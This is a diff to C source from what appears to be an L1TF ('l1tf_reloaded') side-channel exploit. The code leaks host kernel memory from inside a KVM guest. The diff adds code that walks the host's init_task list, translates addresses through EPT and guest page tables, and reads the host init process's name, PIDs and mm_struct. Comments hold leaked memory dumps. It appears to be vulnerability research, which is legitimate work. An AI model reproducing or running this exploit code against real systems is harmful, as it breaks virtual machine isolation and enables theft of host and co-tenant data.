@@ -273,7 +273,7 @@ hva_t leak_kvm_vcpu(hpa_t base, hva_t direct_map, hva_t kvm)
 	hva_t vcpu = -1, kvm_leak = -1;
 	do {
 		hpa_t kvm_ = kvm - direct_map;
-		hva_t head = leak_u64(base, kvm_ + KVM_VCPU_ARRAY + 8, ITERS);
+		hva_t head = leak_u64(base, kvm_ + H_KVM_VCPU_ARRAY + 8, ITERS);
 		hpa_t head_ = head - direct_map;
 		u64 entry = leak_u64(base, head_, ITERS);
 		hva_t ptr = (entry << 16) | (entry >> 48); // Crazy xarray stuff.
@@ -636,23 +636,93 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 
 	printf("\n========================\n\n");
 
-	while (1) {
-		gcr3 = hc_read_va(kvm_vcpu_arch+0xa0);
-		// gcr3 = procfs_pgd() - procfs_direct_map();
-		dump(gcr3);
-		gcr3 &= PFN_MASK;
-		gcr3_hpa = get_feeling_translate_va(eptp, gcr3);
-		dump(gcr3_hpa);
 
-		gva_t gva = text + 0x1c112c0;
-		procfs_get_physaddr(gva);
-		hpa_t pa = get_feeling_translate_gva(gva, gcr3_hpa, eptp);
-		dump(pa);
-		dump(hc_read_pa(pa));
-		dump(procfs_get_data(gva));
+	gva_t swapper = text + G_TEXT_INIT_TASK;
+	dump(swapper);
 
-		sleep(2);
-	}
+	gva_t swapper_tasks_next = swapper + G_TASK_TASKS;
+	hpa_t swapper_tasks_next_hpa = get_feeling_translate_gva(swapper_tasks_next, gcr3_hpa, eptp);
+
+	dump(swapper_tasks_next_hpa);
+	for (int off = -0x80; off < 0x80; off += 8)
+		printf("swapper_tasks_next_hpa + %4x: %16lx\n", off, hc_read_pa(swapper_tasks_next_hpa+off));
+
+	gva_t init = hc_read_pa(swapper_tasks_next_hpa) - G_TASK_TASKS;
+
+	gva_t init_comm = init + G_TASK_COMM;
+	hpa_t init_comm_hpa = get_feeling_translate_gva(init_comm, gcr3_hpa, eptp);
+	char initcomm[16];
+	*(u64 *)initcomm = hc_read_pa(init_comm_hpa);
+	*(u64 *)(initcomm+8) = hc_read_pa(init_comm_hpa+8);
+	display(initcomm, sizeof(initcomm));
+
+	gva_t init_pids = init + G_TASK_PID;
+	hpa_t init_pids_hpa = get_feeling_translate_gva(init_pids, gcr3_hpa, eptp);
+	printf("PIDs: %lx\n", hc_read_pa(init_pids_hpa));
+
+	hpa_t search = get_feeling_translate_gva(init+0x880, gcr3_hpa, eptp);
+	dump(search);
+	for (int off = 0; off < 0x200; off += 8)
+		printf("init + 0x880 + %4x: %16lx\n", off, hc_read_pa(search+off));
+
+	gva_t init_mm = hc_read_pa(get_feeling_translate_gva(init + G_TASK_MM, gcr3_hpa, eptp));
+	hpa_t init_mm_hpa = get_feeling_translate_gva(init_mm, gcr3_hpa, eptp);
+	dump(init_comm_hpa);
+	for (int off = 0; off < 0x200; off += 8)
+		printf("init_mm + %4x: %16lx\n", off, hc_read_pa(init_mm_hpa+off));
+
+	//         init_comm_hpa =        7aba8eca8
+	// init_mm + 0x100 +    0:                0
+	// init_mm + 0x100 +    8:                0
+	// init_mm + 0x100 +   10:             13b6
+	// init_mm + 0x100 +   18:              9b8
+	// init_mm + 0x100 +   20:              103
+	// init_mm + 0x100 +   28:                0
+	// init_mm + 0x100 +   30:             93ac
+	// init_mm + 0x100 +   38:     55592c5e6000  <-- start_code
+	// init_mm + 0x100 +   40:     55592c6c558d  <-- end_code
+	// init_mm + 0x100 +   48:     55592c725e90  <-- start_data
+	// init_mm + 0x100 +   50:     55592c77411c  <-- end_data
+	// init_mm + 0x100 +   58:     5559396db000  <-- start_brk @+0x158
+	// init_mm + 0x100 +   60:     5559399d4000  <-- brk
+	// init_mm + 0x100 +   68:     7ffc9f74de30  <-- start_stack
+	// init_mm + 0x100 +   70:     7ffc9f74ff1f  <-- arg_start
+	// init_mm + 0x100 +   78:     7ffc9f74ff2a  <-- arg_end
+	// init_mm + 0x100 +   80:     7ffc9f74ff2a  <-- env_start
+	// init_mm + 0x100 +   88:     7ffc9f74ffed  <-- env_end
+	// init_mm + 0x100 +   90:               21
+	// init_mm + 0x100 +   98:     7f5ff0aa0000
+	// init_mm + 0x100 +   a0:               33
+	// init_mm + 0x100 +   a8:              e30
+	// init_mm + 0x100 +   b0:               10
+	// init_mm + 0x100 +   b8:         1f8bfbff
+	// init_mm + 0x100 +   c0:                6
+	// mathe@rain-vm-father:~/l1tf_reloaded$ sudo cat /proc/1/maps
+	// 55592c5e6000-55592c6c6000 r-xp 00036000 08:03 1049207                    /usr/lib/systemd/systemd
+	// 5559396db000-5559399d4000 rw-p 00000000 00:00 0                          [heap]
+	// 7ffc9f64d000-7ffc9f750000 rw-p 00000000 00:00 0                          [stack]
+
+	//                  init_comm_hpa =        7aba8eca8
+	// init_mm +    0:                1
+	// init_mm +    8:                0
+	// init_mm +   10:                0
+	// init_mm +   18:                0
+	// init_mm +   20:                0
+	// init_mm +   28:                0
+	// init_mm +   30:                0
+	// init_mm +   38:                0
+	// init_mm +   40:      30f00000000
+	// init_mm +   48: ffff970cce3ce61e
+	// init_mm +   50:     7f5ff0ade000
+	// init_mm +   58:     2b46b96cd000
+	// init_mm +   60:         f7fd3000
+	// init_mm +   68:         55580000
+	// init_mm +   70:     7ffffffff000
+	// init_mm +   78: ffff970cc33ee000  <-- pgd
+	// init_mm +   80:        100000000
+	// init_mm +   88:     2f5408000c40
+
+
 
 }
 
@@ -1104,7 +1174,7 @@ void reverse_host_kernel_data_structures(void)
 	dump(kvm_pa);
 
 	char kvm_mid[0x250];
-	hpa_t kvm_start = kvm_pa + KVM_VCPU_ARRAY - sizeof(kvm_mid)/2;
+	hpa_t kvm_start = kvm_pa + H_KVM_VCPU_ARRAY - sizeof(kvm_mid)/2;
 	for (int i = 0; i < 100; i++) {
 		printf("kvm_start, i.e. %lx: (i = %d)\n", kvm_start, i);
 		l1tf_leak(kvm_mid, base, kvm_start, sizeof(kvm_mid));
@@ -1196,7 +1266,7 @@ void old_comm_and_task_reversing(void)
 	// display(comm, 0x10);
 
 	// char tasks[0x40];
-	// l1tf_leak(tasks, base, pa(task_struct+TASK_TASKS-0x10), 0x40);
+	// l1tf_leak(tasks, base, pa(task_struct+H_TASK_TASKS-0x10), 0x40);
 	// display(tasks, 0x40);
 	//    0:                0 00 00 00 00 00 00 00 00 ........
 	//    8:    248be3fe15218 18 52 e1 3f be 48 02 00 .R.?.H..
@@ -1217,14 +1287,14 @@ void old_comm_and_task_reversing(void)
 	// 18:  ffff93416c014a98   98 4a 01 6c 41 93 ff ff .J.lA...
 
 	// char comm[16];
-	// l1tf_leak_multi(comm, base, pa(0xffff93416c014a80-TASK_TASKS+OFF_COMM), sizeof(comm), 11);
+	// l1tf_leak_multi(comm, base, pa(0xffff93416c014a80-H_TASK_TASKS+OFF_COMM), sizeof(comm), 11);
 	// display(comm, sizeof(comm));
 	//    0:  6961775f6b736174   74 61 73 6b 5f 77 61 69 task_wai
 	//    8:    7275650f726574   74 65 72 0f 65 75 72 00 ter.eur.
 
 	// const int len = 0xc0;
 	// char data[len];
-	// l1tf_leak(data, base, pa(0xffff93416c014a80-TASK_TASKS), len);
+	// l1tf_leak(data, base, pa(0xffff93416c014a80-H_TASK_TASKS), len);
 	// display(data, len);
 }
 
